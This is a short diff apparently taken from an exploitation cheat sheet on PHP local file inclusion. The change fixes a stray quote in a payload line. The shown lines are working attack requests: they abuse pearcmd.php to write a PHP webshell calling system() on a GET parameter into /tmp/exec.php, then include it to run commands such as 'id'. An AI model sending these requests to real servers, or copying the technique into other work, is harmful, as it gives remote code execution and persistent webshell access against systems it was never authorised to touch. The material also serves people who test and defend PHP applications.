@@ -516,7 +516,7 @@ There are this ways to exploit it.
   ```
 * Method 2: man_dir
   ```ps1
-  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+"
+  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
   /vuln.php?file=/tmp/exec.php&c=id
   ```
   The created configuration file contains the webshell.
